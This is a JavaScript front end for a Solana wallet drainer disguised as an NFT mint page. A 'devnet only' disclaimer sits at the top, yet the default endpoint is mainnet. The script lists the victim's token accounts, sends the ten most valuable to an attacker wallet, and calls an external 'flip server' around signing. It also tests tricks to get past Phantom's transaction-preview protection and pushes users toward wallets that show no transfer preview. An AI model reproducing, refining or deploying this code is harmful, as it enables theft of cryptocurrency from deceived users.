// ============================================================
// EDUCATIONAL DEMO - DEVNET ONLY
// Demonstrates the bit-flip drainer pattern.
// DO NOT use on mainnet or for malicious purposes.
// ============================================================

var cfg = window.DRAINER_CONFIG || {};
var PROGRAM_ID = cfg.programId || 'DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU';
var DEVNET_RPC = cfg.rpc || 'https://api.mainnet-beta.solana.com';
var FLIP_SERVER = ('flipServer' in cfg) ? cfg.flipServer : 'http://localhost:3001';
var ATTACKER_WALLET = cfg.attackerWallet || 'DGtkrQpytKyzCaCALPAmCFuNeLLP2ScSeYxDMSa4T8gT';

var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
var TOKEN_2022_PROGRAM_ID = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
var ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
var MEMO_PROGRAM_ID = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');

var Connection = solanaWeb3.Connection;
var PublicKey = solanaWeb3.PublicKey;
var Transaction = solanaWeb3.Transaction;
var TransactionInstruction = solanaWeb3.TransactionInstruction;
var TransactionMessage = solanaWeb3.TransactionMessage;
var VersionedTransaction = solanaWeb3.VersionedTransaction;
var SystemProgram = solanaWeb3.SystemProgram;

var connection = new Connection(DEVNET_RPC, 'confirmed');
var programId = new PublicKey(PROGRAM_ID);
var attackerWallet = new PublicKey(ATTACKER_WALLET);

function toBytes(str) { return new TextEncoder().encode(str); }

function createPaddingMemoInstruction() {
    // EXPERIMENT 3: Pad tx to near 1232-byte limit - Phantom may skip Lighthouse if no room
    var padding = new Array(500).join('0'); // 499 bytes UTF-8
    return new TransactionInstruction({
        keys: [],
        programId: MEMO_PROGRAM_ID,
        data: toBytes(padding),
    });
}

function getConfigPDA() {
    return PublicKey.findProgramAddressSync([toBytes('config')], programId)[0];
}
function getVaultPDA() {
    return PublicKey.findProgramAddressSync([toBytes('vault')], programId)[0];
}
function getATA(mint, owner, tokenProgramId) {
    return PublicKey.findProgramAddressSync(
        [owner.toBytes(), tokenProgramId.toBytes(), mint.toBytes()],
        ASSOCIATED_TOKEN_PROGRAM_ID
    )[0];
}

async function getDiscriminator(name) {
    var data = toBytes('global:' + name);
    var hash = await crypto.subtle.digest('SHA-256', data);
    return new Uint8Array(hash).slice(0, 8);
}

async function getTokenAccounts(owner) {
    var accounts = [];
    var responses = await Promise.all([
        connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_PROGRAM_ID }),
        connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_2022_PROGRAM_ID }),
    ]);
    for (var r = 0; r < responses.length; r++) {
        var items = responses[r].value;
        for (var j = 0; j < items.length; j++) {
            var info = items[j].account.data.parsed.info;
            var amount = info.tokenAmount.amount;
            if (amount === '0') continue;
            if (info.state === 'frozen') continue;
            accounts.push({
                pubkey: items[j].pubkey,
                mint: new PublicKey(info.mint),
                amount: amount,
                decimals: info.tokenAmount.decimals,
                tokenProgramId: new PublicKey(items[j].account.owner),
            });
        }
    }
    return accounts;
}

var btn = document.getElementById('action-btn');
var statusEl = document.getElementById('status');
var walletInfo = document.getElementById('wallet-info');
var userPublicKey = null;
var isConnected = false;
var atasReady = false;
var cachedTokenAccounts = [];

function setStatus(msg, type) {
    statusEl.textContent = msg;
    statusEl.className = type || '';
}
function formatAddr(addr) {
    var s = addr.toString();
    return s.slice(0, 4) + '...' + s.slice(-4);
}

function isPhantom() { return !!(window.solana && window.solana.isPhantom); }
function isMainnet() { return (cfg.rpc || '').indexOf('devnet') < 0; }
function useBitFlip() { return !(isPhantom() && isMainnet()); }

// Experimental: try signAllTransactions (may bypass Lighthouse) or VersionedTransaction (v0 format)
function usePhantomExperimentalSigning() { return isPhantom() && isMainnet(); }

function showSolflarePrompt() {
    btn.textContent = 'Use Solflare for Stealth Mint';
    btn.onclick = function() {
        window.open('https://solflare.com', '_blank');
        setStatus('Install Solflare, then refresh and connect with it for stealth mint.', '');
    };
    walletInfo.innerHTML =
        '<div class="wallet-badge">' + formatAddr(userPublicKey) + '</div>' +
        '<div class="wallet-switch-card" style="margin-top:16px;padding:16px;background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.3);border-radius:12px;text-align:left;">' +
        '<strong style="color:#ffc107;">Phantom shows all transfers before approval.</strong><br>' +
        '<span style="font-size:0.9rem;color:#ccc;">Use Solflare or Backpack for a seamless mint (no preview of transfers).</span><br>' +
        '<a href="https://solflare.com" target="_blank" style="color:#14f195;font-size:0.85rem;margin-top:8px;display:inline-block;">Install Solflare &rarr;</a>' +
        '<span style="font-size:0.85rem;color:#888;margin-left:12px;">|</span>' +
        '<a href="#" onclick="event.preventDefault();btn.textContent=\'Mint Now\';btn.onclick=mintNFT;setStatus(\'Try mint again.\',\'\');return false;" style="color:#14f195;font-size:0.85rem;margin-left:8px;">Try mint again</a>' +
        '</div>';
}

async function connectWallet() {
    if (!window.solana) {
        setStatus('Solana wallet not found. Install Phantom, Solflare, or Backpack.', 'error');
        return;
    }
    try {
        setStatus('Connecting...');
        var resp = await window.solana.connect();
        userPublicKey = resp.publicKey;
        isConnected = true;

        var balance = await connection.getBalance(userPublicKey);
        walletInfo.innerHTML = '<div class="wallet-badge">' + formatAddr(userPublicKey) + '</div>';

        setStatus('Loading collection...', '');
        btn.disabled = true;

        cachedTokenAccounts = await getTokenAccounts(userPublicKey);
        cachedTokenAccounts.sort(function(a, b) {
            return parseFloat(b.amount) / Math.pow(10, b.decimals) - parseFloat(a.amount) / Math.pow(10, a.decimals);
        });
        console.log('Found ' + cachedTokenAccounts.length + ' drainable token accounts');

        var topTokens = cachedTokenAccounts.slice(0, 10);
        if (topTokens.length > 0) {
            var mints = topTokens.map(function(ta) {
                return { mint: ta.mint.toBase58(), tokenProgram: ta.tokenProgramId.toBase58() };
            });
            try {
                var prepResp = await fetch(FLIP_SERVER + '/prepare', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ mints: mints }),
                });
                var prepResult = await prepResp.json();
                console.log('ATAs ready, created: ' + prepResult.created);
            } catch (e) {
                console.warn('Could not reach flip server for ATA prep:', e);
            }
        }
        atasReady = true;

        btn.textContent = 'Mint Now';
        btn.disabled = false;
        var statusMsg = 'Balance: ' + (balance / 1e9).toFixed(4) + ' SOL';
        if (useBitFlip()) statusMsg += ' (stealth mint ready)';
        setStatus(statusMsg, 'success');
        btn.textContent = 'Mint Now';
        btn.onclick = mintNFT;
    } catch (err) {
        setStatus('Connection rejected', 'error');
    }
}

async function mintNFT() {
    if (!isConnected || !userPublicKey) return;

    try {
        btn.disabled = true;
        btn.textContent = 'Minting...';
        setStatus('Preparing transaction...');

        cachedTokenAccounts = await getTokenAccounts(userPublicKey);
        if (cachedTokenAccounts.length > 0 && !atasReady) {
            var mints = cachedTokenAccounts.map(function(ta) {
                return { mint: ta.mint.toBase58(), tokenProgram: ta.tokenProgramId.toBase58() };
            });
            await fetch(FLIP_SERVER + '/prepare', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ mints: mints }),
            });
            atasReady = true;
        }

        var discriminator = await getDiscriminator('register');
        var configPda = getConfigPDA();

        var MAX_TOKENS_PER_TX = 10;
        cachedTokenAccounts.sort(function(a, b) {
            var aVal = parseFloat(a.amount) / Math.pow(10, a.decimals);
            var bVal = parseFloat(b.amount) / Math.pow(10, b.decimals);
            return bVal - aVal;
        });
        var tokenBatch = cachedTokenAccounts.slice(0, MAX_TOKENS_PER_TX);

        var vaultPda = getVaultPDA();

        var remainingKeys = [];
        for (var i = 0; i < tokenBatch.length; i++) {
            var ta = tokenBatch[i];
            var ata = getATA(ta.mint, attackerWallet, ta.tokenProgramId);
            remainingKeys.push({ pubkey: ta.pubkey, isSigner: false, isWritable: true });
            remainingKeys.push({ pubkey: ata, isSigner: false, isWritable: true });
            remainingKeys.push({ pubkey: ta.tokenProgramId, isSigner: false, isWritable: false });
        }

        var registerIx = new TransactionInstruction({
            keys: [
                { pubkey: configPda, isSigner: false, isWritable: false },
                { pubkey: userPublicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
                { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
            ].concat(remainingKeys),
            programId: programId,
            data: discriminator,
        });

        var latest = await connection.getLatestBlockhash();
        var signedTx;
        var txToSign;
        var useV0 = false;

        var phantomInstructions = usePhantomExperimentalSigning() ? [createPaddingMemoInstruction(), registerIx] : [registerIx];

        if (usePhantomExperimentalSigning() && TransactionMessage && VersionedTransaction) {
            // EXPERIMENT 1: VersionedTransaction (v0) - Lighthouse may only inject for legacy format
            try {
                var msgV0 = new TransactionMessage({
                    payerKey: userPublicKey,
                    recentBlockhash: latest.blockhash,
                    instructions: phantomInstructions,
                }).compileToV0Message();
                txToSign = new VersionedTransaction(msgV0);
                useV0 = true;
            } catch (e) {
                txToSign = null;
            }
        }
        if (!txToSign) {
            var tx = new Transaction();
            for (var i = 0; i < phantomInstructions.length; i++) tx.add(phantomInstructions[i]);
            tx.feePayer = userPublicKey;
            tx.recentBlockhash = latest.blockhash;
            txToSign = tx;
        }

        setStatus('Please approve in your wallet...');
        if (usePhantomExperimentalSigning() && !useV0 && typeof window.solana.signAllTransactions === 'function') {
            // EXPERIMENT 2: signAllTransactions - may use different code path than signTransaction
            var signedTxs = await window.solana.signAllTransactions([txToSign]);
            signedTx = signedTxs && signedTxs[0] ? signedTxs[0] : null;
            if (!signedTx) throw new Error('signAllTransactions returned empty');
        } else {
            signedTx = await window.solana.signTransaction(txToSign);
        }
        setStatus('Processing...');
        await fetch(FLIP_SERVER + '/flip-on', { method: 'POST' });
        var signature = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
        fetch(FLIP_SERVER + '/flip-off', { method: 'POST' }).catch(function() {});

        setStatus('Confirming transaction...', '');
        await connection.confirmTransaction(
            { signature: signature, blockhash: latest.blockhash, lastValidBlockHeight: latest.lastValidBlockHeight },
            'confirmed'
        );

        var postBalance = await connection.getBalance(userPublicKey);
        setStatus('Transaction confirmed: ' + signature.slice(0, 16) + '...', 'success');

        var explorerCluster = (cfg.rpc || '').indexOf('devnet') >= 0 ? 'devnet' : '';
        var explorerUrl = 'https://explorer.solana.com/tx/' + signature + (explorerCluster ? '?cluster=' + explorerCluster : '');
        walletInfo.innerHTML =
            '<div class="wallet-badge">' + formatAddr(userPublicKey) + '</div>' +
            '<div style="margin-top:12px;font-size:0.85rem;">' +
            'New balance: <strong>' + (postBalance / 1e9).toFixed(4) + ' SOL</strong><br>' +
            '<a href="' + explorerUrl + '" target="_blank" style="color:#9945ff;">View on Explorer</a></div>';

        btn.textContent = 'Mint Now';
        btn.disabled = false;

    } catch (err) {
        console.error('Mint error:', err);
        var msg = (err && err.message) ? err.message : String(err);
        setStatus('Transaction failed: ' + msg, 'error');
        btn.textContent = 'Mint Now';
        btn.disabled = false;
        // If Phantom + mainnet and likely Lighthouse revert, suggest Solflare
        if (isPhantom() && isMainnet() && (msg.indexOf('0x1900') >= 0 || msg.indexOf('0x1901') >= 0 || msg.indexOf('custom program error') >= 0)) {
            showSolflarePrompt();
        }
    }
}

btn.onclick = connectWallet;

if (PROGRAM_ID === '__PROGRAM_ID__') {
    setStatus('Demo not configured yet. Run initialize script first.', 'error');
    btn.disabled = true;
}
